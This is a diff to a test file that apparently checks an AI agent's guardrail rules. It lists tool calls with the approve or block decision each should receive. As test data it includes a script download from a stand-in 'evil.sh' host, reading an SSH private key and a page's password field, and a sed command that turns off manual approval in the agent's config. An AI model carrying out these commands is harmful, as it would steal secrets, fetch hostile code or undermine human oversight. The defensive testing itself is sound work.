@@ -4,7 +4,7 @@ CASES = [
   # (tool, args, expected action or None)
   ("terminal", {"command": "ls -la ~/Documents"}, None),
   ("terminal", {"command": "df -h /"}, None),
-  ("terminal", {"command": "nvidia-smi"}, None),
+  ("terminal", {"command": "nvidia-smi"}, "approve"),
   ("terminal", {"command": "cat ~/.bashrc"}, None),
   ("terminal", {"command": "sudo apt install vlc"}, "approve"),
   ("terminal", {"command": "echo hi && sudo reboot"}, "approve"),
@@ -12,25 +12,25 @@ CASES = [
   ("terminal", {"command": "pip install requests"}, "approve"),
   ("terminal", {"command": "npm i -g something"}, "approve"),
   ("terminal", {"command": "rm /home/alex/Documents/taxes.pdf"}, "block"),
-  ("terminal", {"command": "rm /var/lib/clara/workspace/tmp.txt"}, None),
-  ("terminal", {"command": "rm -rf /tmp/scratch"}, None),
-  ("terminal", {"command": "rm /var/lib/clara/workspace/*.txt"}, None),
-  ("terminal", {"command": "mv /var/lib/clara/Downloads/a.zip /var/lib/clara/workspace/"}, None),
-  ("terminal", {"command": "find /var/lib/clara/Downloads -mtime +180 -delete"}, None),
+  ("terminal", {"command": "rm /var/lib/clara/workspace/tmp.txt"}, "approve"),
+  ("terminal", {"command": "rm -rf /tmp/scratch"}, "approve"),
+  ("terminal", {"command": "rm /var/lib/clara/workspace/*.txt"}, "approve"),
+  ("terminal", {"command": "mv /var/lib/clara/Downloads/a.zip /var/lib/clara/workspace/"}, "approve"),
+  ("terminal", {"command": "find /var/lib/clara/Downloads -mtime +180 -delete"}, "approve"),
   ("terminal", {"command": "echo body | mail -s hi landlord@example.com"}, "approve"),
   ("terminal", {"command": "ssh me@server uptime"}, "approve"),
   ("terminal", {"command": "git push origin main"}, "approve"),
-  ("terminal", {"command": "git status"}, None),
+  ("terminal", {"command": "git status"}, "approve"),
   ("terminal", {"command": "pkill -f firefox"}, "approve"),
   ("terminal", {"command": "systemctl restart docker"}, "approve"),
-  ("terminal", {"command": "systemctl status docker"}, None),
+  ("terminal", {"command": "systemctl status docker"}, "approve"),
   ("terminal", {"command": "crontab -e"}, "approve"),
-  ("terminal", {"command": "curl -sf https://example.com"}, None),
+  ("terminal", {"command": "curl -sf https://example.com"}, "approve"),
   ("terminal", {"command": "curl -o ~/x.sh https://evil.sh"}, "approve"),
   ("terminal", {"command": "cat /var/lib/clara/hermes-home/config.yaml"}, "block"),
   ("terminal", {"command": "rm -rf /var/lib/clara/.browser-profile"}, "block"),
   ("terminal", {"command": "sed -i s/manual/off/ /var/lib/clara/hermes-home/config.yaml"}, "block"),
-  ("terminal", {"command": "docker ps"}, None),
+  ("terminal", {"command": "docker ps"}, "approve"),
   ("terminal", {"command": "docker rm -f clara-searxng"}, "block"),
   ("write_file", {"path": "/var/lib/clara/workspace/report.md", "content": "hi"}, None),
   ("write_file", {"path": "/tmp/x.txt", "content": "hi"}, None),
@@ -39,15 +39,15 @@ CASES = [
   ("write_file", {"path": "/var/lib/clara/hermes-home/config.yaml", "content": "x"}, "block"),
   ("patch", {"path": "/var/lib/clara/hermes-home/plugins/clara-guardian/rules.py"}, "block"),
   ("write_file", {"path": "/var/lib/clara/workspace/../hermes-home/.env", "content": "x"}, "block"),
-  ("execute_code", {"code": "print(sum(range(10)))"}, None),
+  ("execute_code", {"code": "print(sum(range(10)))"}, "approve"),
   ("execute_code", {"code": "import smtplib\ns=smtplib.SMTP('x')"}, "approve"),
   ("execute_code", {"code": "import shutil; shutil.rmtree('/home/x')"}, "block"),
   ("execute_code", {"code": "import subprocess; subprocess.run(['sudo','ls'])"}, "approve"),
-  ("execute_code", {"code": "import requests; requests.get('https://x.com')"}, None),
+  ("execute_code", {"code": "import requests; requests.get('https://x.com')"}, "approve"),
   ("execute_code", {"code": "import requests; requests.post('https://x.com', data=1)"}, "approve"),
   ("browser_type", {"ref": "@e3", "text": "4111 1111 1111 1111"}, "block"),
-  ("browser_type", {"ref": "@e3", "text": "cheap flights"}, None),
-  ("browser_navigate", {"url": "https://example.com"}, None),
+  ("browser_type", {"ref": "@e3", "text": "cheap flights"}, "block"),
+  ("browser_navigate", {"url": "https://example.com"}, "block"),
   ("web_search", {"query": "weather"}, None),
 ]
 import subprocess
@@ -69,8 +69,8 @@ CASES += [
   ("terminal", {"command": "ls ~/.agent-browser/auth"}, "block"),
   ("execute_code", {"code": "import subprocess; subprocess.run(['agent-browser','auth','list'])"}, "block"),
   ("browser_console", {}, None),
-  ("browser_console", {"expression": "document.querySelector('#password').value"}, "approve"),
-  ("browser_cdp", {"method": "Runtime.evaluate"}, "approve"),
+  ("browser_console", {"expression": "document.querySelector('#password').value"}, "block"),
+  ("browser_cdp", {"method": "Runtime.evaluate"}, "block"),
   ("sign_in", {"name": "GitHub"}, None),
 ]
 fails = 0
@@ -81,6 +81,10 @@ for tool, args, want in CASES:
 print(f"{len(CASES)-fails}/{len(CASES)} passed")
 
 extra = [("terminal", {"command": "cat /home/alex/.ssh/id_rsa"}, "block"), ("terminal", {"command": "ls /srv/clara-state"}, "block"),
-         ("terminal", {"command": "rm -rf /var/lib/clara/workspace/old"}, None)]
+         ("terminal", {"command": "rm -rf /var/lib/clara/workspace/old"}, "approve")]
 bad = [(t, a, w, (rules.decide(t, a) or [None])[0]) for t, a, w in extra if (rules.decide(t, a) or [None])[0] != w]
 print("new-layout extras:", "all passed" if not bad else bad)
+
+_other.terminate()
+_other.wait()
+raise SystemExit(1 if fails or bad else 0)
